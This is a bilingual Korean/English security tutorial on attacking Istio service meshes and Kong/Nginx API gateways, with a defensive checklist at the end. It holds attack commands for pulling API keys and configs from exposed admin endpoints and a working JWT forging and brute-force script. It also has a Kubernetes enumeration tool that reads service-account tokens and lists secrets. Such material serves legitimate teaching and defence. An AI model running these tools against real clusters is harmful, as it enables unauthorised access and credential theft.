> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 서비스 메시 및 API 게이트웨이 공격

## 0. 초보자를 위한 개념 이해

### 서비스 메시와 API 게이트웨이란?

마이크로서비스 환경에서 수십~수백 개의 서비스가 서로 통신할 때, 각 서비스마다 인증·암호화·재시도 로직을 구현하기는 어렵다. 서비스 메시(Istio, Linkerd)는 이를 인프라 레이어에서 자동 처리한다. API 게이트웨이(Kong, AWS API GW)는 외부 트래픽이 내부 서비스로 들어오는 입구를 단일화한다. 이 레이어의 보안 설정 오류는 전체 마이크로서비스 인프라를 위험에 노출시킨다.

**왜 배우는가:**
```
서비스 메시 보안의 중요성

설정 오류 시나리오:

PeerAuthentication 미설정 (mTLS 없음):
  서비스A → 서비스B (평문 HTTP)
  → 클러스터 내 다른 Pod가 트래픽 도청 가능

AuthorizationPolicy 없음:
  모든 서비스 → 모든 서비스 통신 허용
  → 침해된 Pod 하나가 모든 서비스에 접근 가능

API 게이트웨이 인증 미적용:
  /api/admin/* → 인증 없이 접근 가능
  → SSRF, 권한 없는 관리 기능 호출
```

### 핵심 개념 정리

```
서비스 메시 핵심 보안 컴포넌트 (Istio 기준)

컴포넌트                역할
──────────────────────────────────────────────────
PeerAuthentication      서비스 간 mTLS 강제 여부
AuthorizationPolicy     서비스 간 접근 제어 규칙
DestinationRule         mTLS 모드, 로드밸런싱 설정
VirtualService          트래픽 라우팅 규칙
Envoy 사이드카          실제 트래픽 처리 프록시
```

### 필요한 도구 및 환경
- **Minikube + Istio**: 로컬 테스트 클러스터
- **istioctl**: Istio CLI 도구
- **kubectl**: K8s 설정 관리
- **ksniff**: Pod 트래픽 캡처 도구

### 기초 실습 예제
```bash
# 1. Istio 설치 (Minikube 기준)
istioctl install --set profile=demo -y
kubectl label namespace default istio-injection=enabled

# 2. mTLS 정책 확인
kubectl get peerauthentication -A    # 네임스페이스별 mTLS 정책
kubectl get destinationrule -A       # 목적지별 TLS 설정

# 3. 취약한 설정 탐지 — PERMISSIVE 모드 (mTLS 선택적)
kubectl get peerauthentication -A -o json | python3 -c "
import json, sys
data = json.load(sys.stdin)
for item in data.get('items', []):
    mtls = item.get('spec', {}).get('mtls', {}).get('mode', 'STRICT')
    ns = item['metadata']['namespace']
    if mtls == 'PERMISSIVE':
        print(f'[경고] {ns}: PERMISSIVE 모드 — 평문 통신 허용')
"

# 4. AuthorizationPolicy 확인 (없으면 모든 통신 허용)
kubectl get authorizationpolicy -A
```

---

## 개요

마이크로서비스 환경에서 서비스 메시(Istio, Linkerd)와 API 게이트웨이(Kong, AWS API Gateway, Nginx Ingress)는 트래픽 제어의 핵심이다. 이 레이어의 보안 설정 오류는 서비스 간 인증 우회, 인가 바이패스, SSRF 등으로 이어질 수 있다.

---

## Istio 서비스 메시 구조

```
외부 트래픽
    │
    ▼
[Istio Ingress Gateway]
    │
    ▼
[사이드카 프록시 (Envoy)]  ←→  [Istio Control Plane (istiod)]
    │
    ▼
[Application Pod]
```

### Istio 주요 컴포넌트

| 컴포넌트 | 역할 |
|----------|------|
| Envoy Proxy | 사이드카로 삽입, 모든 트래픽 처리 |
| istiod (Pilot) | 설정 배포, 인증서 관리 |
| PeerAuthentication | mTLS 정책 |
| AuthorizationPolicy | 서비스 간 접근 제어 |
| VirtualService | 트래픽 라우팅 규칙 |

---

## Istio 공격 벡터

### 1. mTLS 우회 (PeerAuthentication 미설정)

```bash
# mTLS 설정 확인
kubectl get peerauthentication -A

# PERMISSIVE 모드 (취약): mTLS와 평문 모두 허용
# STRICT 모드 (안전): mTLS만 허용

# PERMISSIVE 설정 확인
kubectl get peerauthentication -A -o yaml | grep mode

# 사이드카 없는 Pod에서 서비스 직접 접근 테스트
# (사이드카 없으면 mTLS 인증서 없어 STRICT에서는 차단됨)
kubectl run test-pod --image=curlimages/curl -it --rm \
  --labels="sidecar.istio.io/inject=false" \
  -- curl http://target-service.namespace.svc.cluster.local:8080/api
```

### 2. AuthorizationPolicy 바이패스

```yaml
# 잘못된 AuthorizationPolicy 예시 (공격자 악용 가능)
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: allow-get-only
spec:
  selector:
    matchLabels:
      app: target-service
  action: ALLOW
  rules:
  - to:
    - operation:
        methods: ["GET"]
# 문제: POST, PUT 등은 기본값으로 DENY인데,
# 다른 AuthorizationPolicy가 없으면 모두 ALLOW
```

```bash
# 잘못 설정된 경우: X-Forwarded-For 헤더 조작으로 소스 IP 위장
curl -H "X-Forwarded-For: 10.0.0.1" \
  http://target-service/internal/admin

# AuthorizationPolicy 전체 확인
kubectl get authorizationpolicy -A -o yaml
```

### 3. Envoy 관리 포트 노출 탐지

Envoy 사이드카의 관리 포트(15000, 15001)가 외부에 노출된 경우:

```bash
# Pod 내에서 Envoy 관리 API 접근 (내부에서만 가능)
kubectl exec -it TARGET_POD -- curl http://localhost:15000/

# 클러스터 정보 탈취
kubectl exec -it TARGET_POD -- curl http://localhost:15000/clusters

# 설정 덤프 (인증서 포함 가능)
kubectl exec -it TARGET_POD -- curl http://localhost:15000/config_dump

# 동적 설정 확인
kubectl exec -it TARGET_POD -- curl http://localhost:15000/listeners

# 관리 포트가 ClusterIP에 노출된 경우
kubectl get svc -A | grep 15000
```

---

## API 게이트웨이 공격

### Kong 게이트웨이 취약점

```bash
# Admin API 공개 노출 확인 (기본 포트 8001)
curl http://GATEWAY_IP:8001/

# 플러그인 목록 (인증 설정 확인)
curl http://GATEWAY_IP:8001/plugins

# 서비스/라우트 목록 탈취
curl http://GATEWAY_IP:8001/services
curl http://GATEWAY_IP:8001/routes

# 컨슈머(인증 정보) 목록
curl http://GATEWAY_IP:8001/consumers

# API 키 탈취
curl http://GATEWAY_IP:8001/consumers/USER/key-auth

# Kong이 JWT 검증하는 경우 - 알고리즘 변조 시도
# "alg": "none" 또는 HS256 → RS256 전환
```

### Nginx Ingress 공격

```bash
# 네임스페이스 격리 우회 - Ingress 어노테이션 인젝션
# 취약한 설정: 사용자 입력이 어노테이션에 반영되는 경우

# 일반적인 Ingress
kubectl get ingress -A -o yaml

# 서브도메인 탈취 (dangling DNS)
# 더 이상 사용하지 않는 Ingress의 도메인이 DNS에 남은 경우

# NGINX Ingress가 허용하는 어노테이션 확인
kubectl get configmap -n ingress-nginx nginx-configuration -o yaml
```

### JWT 검증 취약점

```python
#!/usr/bin/env python3
"""JWT 취약점 테스터 - alg confusion 및 weak secret 탐지"""

import base64
import hashlib
import hmac
import json
import sys
from pathlib import Path


def decode_jwt_without_verify(token: str) -> tuple[dict, dict]:
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("유효하지 않은 JWT 형식")

    def b64decode(s: str) -> bytes:
        s += "=" * (4 - len(s) % 4)
        return base64.urlsafe_b64decode(s)

    header = json.loads(b64decode(parts[0]))
    payload = json.loads(b64decode(parts[1]))
    return header, payload


def try_none_algorithm(token: str) -> str:
    """alg=none 공격: 서명 검증 비활성화"""
    parts = token.split(".")

    header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
    header["alg"] = "none"

    new_header = base64.urlsafe_b64encode(
        json.dumps(header, separators=(",", ":")).encode()
    ).rstrip(b"=").decode()

    return f"{new_header}.{parts[1]}."  # 서명 빈값


def try_weak_secret(token: str, wordlist_path: Path) -> str | None:
    """약한 시크릿 키 브루트포스"""
    parts = token.split(".")
    message = f"{parts[0]}.{parts[1]}"
    expected_sig_b64 = parts[2]

    def b64decode_sig(s: str) -> bytes:
        s += "=" * (4 - len(s) % 4)
        return base64.urlsafe_b64decode(s)

    expected_sig = b64decode_sig(expected_sig_b64)

    with open(wordlist_path, "r", errors="ignore") as f:
        for line in f:
            secret = line.strip()
            computed = hmac.new(
                secret.encode(),
                message.encode(),
                hashlib.sha256,
            ).digest()
            if computed == expected_sig:
                return secret
    return None


def forge_jwt(payload: dict, secret: str, algorithm: str = "HS256") -> str:
    """JWT 위조 (약한 시크릿 발견 시)"""
    header = {"alg": algorithm, "typ": "JWT"}

    def b64encode(data: dict) -> str:
        return base64.urlsafe_b64encode(
            json.dumps(data, separators=(",", ":")).encode()
        ).rstrip(b"=").decode()

    h = b64encode(header)
    p = b64encode(payload)
    message = f"{h}.{p}"

    if algorithm == "HS256":
        sig = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
        sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
        return f"{message}.{sig_b64}"

    raise ValueError(f"지원하지 않는 알고리즘: {algorithm}")
```

---

## Python: 쿠버네티스 API 열거 도구

```python
#!/usr/bin/env python3
"""
Kubernetes API Enumerator - 서비스어카운트 토큰 기반 권한 열거
사용법: python3 k8s_enum.py --token TOKEN --server https://K8S_API:6443
"""

import argparse
import json
import ssl
import sys
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field


@dataclass
class K8sClient:
    server: str
    token: str
    verify_ssl: bool = False

    def request(self, path: str) -> dict | list | None:
        url = f"{self.server.rstrip('/')}{path}"
        headers = {
            "Authorization": f"Bearer {self.token}",
            "Accept": "application/json",
        }
        ctx = ssl.create_default_context()
        if not self.verify_ssl:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

        try:
            req = urllib.request.Request(url, headers=headers)
            with urllib.request.urlopen(req, context=ctx, timeout=10) as resp:
                return json.loads(resp.read())
        except urllib.error.HTTPError as e:
            if e.code == 403:
                return None  # 권한 없음
            return None
        except Exception:
            return None


@dataclass
class ClusterInfo:
    namespaces: list[str] = field(default_factory=list)
    pods: list[dict] = field(default_factory=list)
    secrets: list[dict] = field(default_factory=list)
    service_accounts: list[dict] = field(default_factory=list)
    services: list[dict] = field(default_factory=list)
    clusterroles: list[dict] = field(default_factory=list)


def enumerate_cluster(client: K8sClient) -> ClusterInfo:
    info = ClusterInfo()

    print("[*] 네임스페이스 열거...")
    ns_data = client.request("/api/v1/namespaces")
    if ns_data:
        info.namespaces = [
            item["metadata"]["name"]
            for item in ns_data.get("items", [])
        ]
        print(f"  [+] 네임스페이스: {len(info.namespaces)}개")
    else:
        print("  [-] 네임스페이스 접근 불가 (기본값 사용)")
        info.namespaces = ["default", "kube-system"]

    def fetch_namespace_resources(ns: str) -> dict:
        result = {"ns": ns, "pods": [], "secrets": [], "sas": [], "svcs": []}

        pod_data = client.request(f"/api/v1/namespaces/{ns}/pods")
        if pod_data:
            result["pods"] = [
                {
                    "name": p["metadata"]["name"],
                    "ns": ns,
                    "node": p["spec"].get("nodeName", ""),
                    "sa": p["spec"].get("serviceAccountName", "default"),
                }
                for p in pod_data.get("items", [])
            ]

        secret_data = client.request(f"/api/v1/namespaces/{ns}/secrets")
        if secret_data:
            result["secrets"] = [
                {
                    "name": s["metadata"]["name"],
                    "ns": ns,
                    "type": s.get("type", ""),
                }
                for s in secret_data.get("items", [])
            ]

        svc_data = client.request(f"/api/v1/namespaces/{ns}/services")
        if svc_data:
            result["svcs"] = [
                {
                    "name": s["metadata"]["name"],
                    "ns": ns,
                    "type": s["spec"].get("type", ""),
                    "cluster_ip": s["spec"].get("clusterIP", ""),
                }
                for s in svc_data.get("items", [])
            ]

        return result

    print("[*] 각 네임스페이스 리소스 열거...")
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = {executor.submit(fetch_namespace_resources, ns): ns
                   for ns in info.namespaces}
        for future in as_completed(futures):
            ns_result = future.result()
            info.pods.extend(ns_result["pods"])
            info.secrets.extend(ns_result["secrets"])
            info.services.extend(ns_result["svcs"])

    # ClusterRole 열거
    cr_data = client.request("/apis/rbac.authorization.k8s.io/v1/clusterroles")
    if cr_data:
        info.clusterroles = [
            {"name": cr["metadata"]["name"]}
            for cr in cr_data.get("items", [])
            if "cluster-admin" in cr["metadata"]["name"]
        ]

    return info


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Kubernetes API Enumerator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
사용 예시:
  # SA 토큰 사용 (Pod 내부)
  python3 k8s_enum.py --token $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

  # 외부에서 kubeconfig 토큰 사용
  python3 k8s_enum.py --server https://K8S_API:6443 --token TOKEN
        """,
    )
    parser.add_argument("--server", default="https://kubernetes.default.svc",
                        help="K8s API 서버 URL")
    parser.add_argument("--token", help="서비스어카운트 JWT 토큰")
    parser.add_argument("--token-file", help="토큰 파일 경로")

    args = parser.parse_args()

    token = args.token
    if not token and args.token_file:
        token = open(args.token_file).read().strip()
    if not token:
        default_token = "/var/run/secrets/kubernetes.io/serviceaccount/token"
        import os
        if os.path.exists(default_token):
            token = open(default_token).read().strip()
            print(f"[*] 기본 SA 토큰 사용: {default_token}")
        else:
            print("[-] 토큰 없음: --token 또는 --token-file 필요")
            sys.exit(1)

    client = K8sClient(server=args.server, token=token)

    print(f"[*] K8s 클러스터 열거: {args.server}")
    info = enumerate_cluster(client)

    print(f"\n{'='*60}")
    print(f"열거 결과 요약")
    print(f"{'='*60}")
    print(f"  네임스페이스: {len(info.namespaces)}개 — {info.namespaces}")
    print(f"  Pod:          {len(info.pods)}개")
    print(f"  Secret:       {len(info.secrets)}개")
    print(f"  Service:      {len(info.services)}개")

    if info.clusterroles:
        print(f"\n[!] cluster-admin 관련 ClusterRole 발견!")
        for cr in info.clusterroles:
            print(f"    {cr['name']}")

    # 민감한 시크릿 탐지
    sensitive_types = {"kubernetes.io/service-account-token", "Opaque"}
    sensitive_secrets = [s for s in info.secrets if s["type"] in sensitive_types]
    if sensitive_secrets:
        print(f"\n[!] 민감한 시크릿 {len(sensitive_secrets)}개:")
        for s in sensitive_secrets[:10]:
            print(f"    {s['ns']}/{s['name']} ({s['type']})")

    # LoadBalancer 서비스 탐지
    lb_services = [s for s in info.services if s["type"] == "LoadBalancer"]
    if lb_services:
        print(f"\n[!] 외부 노출 서비스 (LoadBalancer) {len(lb_services)}개:")
        for s in lb_services:
            print(f"    {s['ns']}/{s['name']}")


if __name__ == "__main__":
    main()
```

---

## 방어 체크리스트

### Istio 보안 설정
```yaml
# 전체 메시 STRICT mTLS 설정
apiVersion: security.istio.io/v1beta1
kind: PeerAuthentication
metadata:
  name: default
  namespace: istio-system
spec:
  mtls:
    mode: STRICT
---
# 기본 DENY AuthorizationPolicy
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: deny-all
  namespace: default
spec:
  {}  # 빈 spec = 모두 거부
```

| 취약점 | 방어 방법 |
|--------|-----------|
| mTLS 미설정 | PeerAuthentication STRICT 모드 |
| AuthorizationPolicy 누락 | deny-all 기본 정책 + 명시적 허용 |
| Envoy 관리 포트 노출 | NetworkPolicy로 15000포트 차단 |
| JWT 약한 시크릿 | 256비트 이상 랜덤 시크릿 |
| Kong Admin API 노출 | Admin API 외부 접근 차단 |

---

<a name="english"></a>

# Service Mesh and API Gateway Attacks

## Overview

In microservice environments, service meshes (Istio, Linkerd) and API gateways (Kong, AWS API Gateway, Nginx Ingress) are the backbone of traffic control. Misconfigurations at this layer can lead to authentication bypass between services, authorization bypass, SSRF, and more.

---

## Istio Service Mesh Architecture

```
External Traffic
    │
    ▼
[Istio Ingress Gateway]
    │
    ▼
[Sidecar Proxy (Envoy)]  ←→  [Istio Control Plane (istiod)]
    │
    ▼
[Application Pod]
```

### Istio Key Components

| Component | Role |
|-----------|------|
| Envoy Proxy | Injected as sidecar, handles all traffic |
| istiod (Pilot) | Configuration distribution, certificate management |
| PeerAuthentication | mTLS policy |
| AuthorizationPolicy | Inter-service access control |
| VirtualService | Traffic routing rules |

---

## Istio Attack Vectors

### 1. mTLS Bypass (PeerAuthentication Not Configured)

```bash
# Check mTLS configuration
kubectl get peerauthentication -A

# PERMISSIVE mode (vulnerable): allows both mTLS and plaintext
# STRICT mode (secure): allows mTLS only

# Check PERMISSIVE configuration
kubectl get peerauthentication -A -o yaml | grep mode

# Test direct service access from Pod without sidecar
# (Without sidecar, no mTLS cert → blocked in STRICT mode)
kubectl run test-pod --image=curlimages/curl -it --rm \
  --labels="sidecar.istio.io/inject=false" \
  -- curl http://target-service.namespace.svc.cluster.local:8080/api
```

### 2. AuthorizationPolicy Bypass

```yaml
# Example of misconfigured AuthorizationPolicy (exploitable by attacker)
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: allow-get-only
spec:
  selector:
    matchLabels:
      app: target-service
  action: ALLOW
  rules:
  - to:
    - operation:
        methods: ["GET"]
# Problem: POST, PUT etc. default to DENY,
# but if no other AuthorizationPolicy exists, everything is ALLOW
```

```bash
# When misconfigured: spoof source IP by manipulating X-Forwarded-For header
curl -H "X-Forwarded-For: 10.0.0.1" \
  http://target-service/internal/admin

# Review all AuthorizationPolicies
kubectl get authorizationpolicy -A -o yaml
```

### 3. Envoy Management Port Exposure Detection

When the Envoy sidecar management ports (15000, 15001) are exposed externally:

```bash
# Access Envoy admin API from inside Pod (internal only)
kubectl exec -it TARGET_POD -- curl http://localhost:15000/

# Extract cluster information
kubectl exec -it TARGET_POD -- curl http://localhost:15000/clusters

# Config dump (may include certificates)
kubectl exec -it TARGET_POD -- curl http://localhost:15000/config_dump

# Check dynamic configuration
kubectl exec -it TARGET_POD -- curl http://localhost:15000/listeners

# If management port is exposed on ClusterIP
kubectl get svc -A | grep 15000
```

---

## API Gateway Attacks

### Kong Gateway Vulnerabilities

```bash
# Check if Admin API is publicly exposed (default port 8001)
curl http://GATEWAY_IP:8001/

# Plugin list (check authentication settings)
curl http://GATEWAY_IP:8001/plugins

# Exfiltrate service/route list
curl http://GATEWAY_IP:8001/services
curl http://GATEWAY_IP:8001/routes

# Consumer (credential) list
curl http://GATEWAY_IP:8001/consumers

# Steal API keys
curl http://GATEWAY_IP:8001/consumers/USER/key-auth

# If Kong validates JWT - try algorithm confusion attack
# "alg": "none" or switch HS256 → RS256
```

### Nginx Ingress Attacks

```bash
# Namespace isolation bypass - Ingress annotation injection
# Vulnerable config: user input reflected in annotations

# List all Ingresses
kubectl get ingress -A -o yaml

# Subdomain takeover (dangling DNS)
# Domain of a deleted Ingress still remains in DNS

# Check annotations allowed by NGINX Ingress
kubectl get configmap -n ingress-nginx nginx-configuration -o yaml
```

### JWT Validation Vulnerabilities

```python
#!/usr/bin/env python3
"""JWT vulnerability tester - alg confusion and weak secret detection"""

import base64
import hashlib
import hmac
import json
import sys
from pathlib import Path


def decode_jwt_without_verify(token: str) -> tuple[dict, dict]:
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("Invalid JWT format")

    def b64decode(s: str) -> bytes:
        s += "=" * (4 - len(s) % 4)
        return base64.urlsafe_b64decode(s)

    header = json.loads(b64decode(parts[0]))
    payload = json.loads(b64decode(parts[1]))
    return header, payload


def try_none_algorithm(token: str) -> str:
    """alg=none attack: disable signature verification"""
    parts = token.split(".")

    header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
    header["alg"] = "none"

    new_header = base64.urlsafe_b64encode(
        json.dumps(header, separators=(",", ":")).encode()
    ).rstrip(b"=").decode()

    return f"{new_header}.{parts[1]}."  # empty signature


def try_weak_secret(token: str, wordlist_path: Path) -> str | None:
    """Brute-force weak secret key"""
    parts = token.split(".")
    message = f"{parts[0]}.{parts[1]}"
    expected_sig_b64 = parts[2]

    def b64decode_sig(s: str) -> bytes:
        s += "=" * (4 - len(s) % 4)
        return base64.urlsafe_b64decode(s)

    expected_sig = b64decode_sig(expected_sig_b64)

    with open(wordlist_path, "r", errors="ignore") as f:
        for line in f:
            secret = line.strip()
            computed = hmac.new(
                secret.encode(),
                message.encode(),
                hashlib.sha256,
            ).digest()
            if computed == expected_sig:
                return secret
    return None


def forge_jwt(payload: dict, secret: str, algorithm: str = "HS256") -> str:
    """Forge JWT (when weak secret is found)"""
    header = {"alg": algorithm, "typ": "JWT"}

    def b64encode(data: dict) -> str:
        return base64.urlsafe_b64encode(
            json.dumps(data, separators=(",", ":")).encode()
        ).rstrip(b"=").decode()

    h = b64encode(header)
    p = b64encode(payload)
    message = f"{h}.{p}"

    if algorithm == "HS256":
        sig = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
        sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
        return f"{message}.{sig_b64}"

    raise ValueError(f"Unsupported algorithm: {algorithm}")
```

---

## Python: Kubernetes API Enumeration Tool

```python
#!/usr/bin/env python3
"""
Kubernetes API Enumerator - privilege enumeration using ServiceAccount tokens
Usage: python3 k8s_enum.py --token TOKEN --server https://K8S_API:6443
"""

import argparse
import json
import ssl
import sys
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field


@dataclass
class K8sClient:
    server: str
    token: str
    verify_ssl: bool = False

    def request(self, path: str) -> dict | list | None:
        url = f"{self.server.rstrip('/')}{path}"
        headers = {
            "Authorization": f"Bearer {self.token}",
            "Accept": "application/json",
        }
        ctx = ssl.create_default_context()
        if not self.verify_ssl:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

        try:
            req = urllib.request.Request(url, headers=headers)
            with urllib.request.urlopen(req, context=ctx, timeout=10) as resp:
                return json.loads(resp.read())
        except urllib.error.HTTPError as e:
            if e.code == 403:
                return None  # no permission
            return None
        except Exception:
            return None


@dataclass
class ClusterInfo:
    namespaces: list[str] = field(default_factory=list)
    pods: list[dict] = field(default_factory=list)
    secrets: list[dict] = field(default_factory=list)
    service_accounts: list[dict] = field(default_factory=list)
    services: list[dict] = field(default_factory=list)
    clusterroles: list[dict] = field(default_factory=list)


def enumerate_cluster(client: K8sClient) -> ClusterInfo:
    info = ClusterInfo()

    print("[*] Enumerating namespaces...")
    ns_data = client.request("/api/v1/namespaces")
    if ns_data:
        info.namespaces = [
            item["metadata"]["name"]
            for item in ns_data.get("items", [])
        ]
        print(f"  [+] Namespaces: {len(info.namespaces)}")
    else:
        print("  [-] Namespace access denied (using defaults)")
        info.namespaces = ["default", "kube-system"]

    def fetch_namespace_resources(ns: str) -> dict:
        result = {"ns": ns, "pods": [], "secrets": [], "sas": [], "svcs": []}

        pod_data = client.request(f"/api/v1/namespaces/{ns}/pods")
        if pod_data:
            result["pods"] = [
                {
                    "name": p["metadata"]["name"],
                    "ns": ns,
                    "node": p["spec"].get("nodeName", ""),
                    "sa": p["spec"].get("serviceAccountName", "default"),
                }
                for p in pod_data.get("items", [])
            ]

        secret_data = client.request(f"/api/v1/namespaces/{ns}/secrets")
        if secret_data:
            result["secrets"] = [
                {
                    "name": s["metadata"]["name"],
                    "ns": ns,
                    "type": s.get("type", ""),
                }
                for s in secret_data.get("items", [])
            ]

        svc_data = client.request(f"/api/v1/namespaces/{ns}/services")
        if svc_data:
            result["svcs"] = [
                {
                    "name": s["metadata"]["name"],
                    "ns": ns,
                    "type": s["spec"].get("type", ""),
                    "cluster_ip": s["spec"].get("clusterIP", ""),
                }
                for s in svc_data.get("items", [])
            ]

        return result

    print("[*] Enumerating resources per namespace...")
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = {executor.submit(fetch_namespace_resources, ns): ns
                   for ns in info.namespaces}
        for future in as_completed(futures):
            ns_result = future.result()
            info.pods.extend(ns_result["pods"])
            info.secrets.extend(ns_result["secrets"])
            info.services.extend(ns_result["svcs"])

    # Enumerate ClusterRoles
    cr_data = client.request("/apis/rbac.authorization.k8s.io/v1/clusterroles")
    if cr_data:
        info.clusterroles = [
            {"name": cr["metadata"]["name"]}
            for cr in cr_data.get("items", [])
            if "cluster-admin" in cr["metadata"]["name"]
        ]

    return info


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Kubernetes API Enumerator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Usage examples:
  # Use SA token (from inside Pod)
  python3 k8s_enum.py --token $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

  # Use kubeconfig token from outside
  python3 k8s_enum.py --server https://K8S_API:6443 --token TOKEN
        """,
    )
    parser.add_argument("--server", default="https://kubernetes.default.svc",
                        help="K8s API server URL")
    parser.add_argument("--token", help="ServiceAccount JWT token")
    parser.add_argument("--token-file", help="Path to token file")

    args = parser.parse_args()

    token = args.token
    if not token and args.token_file:
        token = open(args.token_file).read().strip()
    if not token:
        default_token = "/var/run/secrets/kubernetes.io/serviceaccount/token"
        import os
        if os.path.exists(default_token):
            token = open(default_token).read().strip()
            print(f"[*] Using default SA token: {default_token}")
        else:
            print("[-] No token: --token or --token-file required")
            sys.exit(1)

    client = K8sClient(server=args.server, token=token)

    print(f"[*] K8s cluster enumeration: {args.server}")
    info = enumerate_cluster(client)

    print(f"\n{'='*60}")
    print(f"Enumeration Results Summary")
    print(f"{'='*60}")
    print(f"  Namespaces: {len(info.namespaces)} — {info.namespaces}")
    print(f"  Pods:       {len(info.pods)}")
    print(f"  Secrets:    {len(info.secrets)}")
    print(f"  Services:   {len(info.services)}")

    if info.clusterroles:
        print(f"\n[!] cluster-admin related ClusterRoles found!")
        for cr in info.clusterroles:
            print(f"    {cr['name']}")

    # Detect sensitive secrets
    sensitive_types = {"kubernetes.io/service-account-token", "Opaque"}
    sensitive_secrets = [s for s in info.secrets if s["type"] in sensitive_types]
    if sensitive_secrets:
        print(f"\n[!] {len(sensitive_secrets)} sensitive secrets:")
        for s in sensitive_secrets[:10]:
            print(f"    {s['ns']}/{s['name']} ({s['type']})")

    # Detect LoadBalancer services
    lb_services = [s for s in info.services if s["type"] == "LoadBalancer"]
    if lb_services:
        print(f"\n[!] Externally exposed services (LoadBalancer): {len(lb_services)}")
        for s in lb_services:
            print(f"    {s['ns']}/{s['name']}")


if __name__ == "__main__":
    main()
```

---

## Defense Checklist

### Istio Security Configuration
```yaml
# Enable STRICT mTLS for the entire mesh
apiVersion: security.istio.io/v1beta1
kind: PeerAuthentication
metadata:
  name: default
  namespace: istio-system
spec:
  mtls:
    mode: STRICT
---
# Default DENY AuthorizationPolicy
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: deny-all
  namespace: default
spec:
  {}  # empty spec = deny all
```

| Vulnerability | Defense |
|---------------|---------|
| mTLS not configured | PeerAuthentication STRICT mode |
| Missing AuthorizationPolicy | deny-all default policy + explicit allow |
| Envoy management port exposed | Block port 15000 with NetworkPolicy |
| Weak JWT secret | 256-bit+ random secret |
| Kong Admin API exposed | Block external access to Admin API |
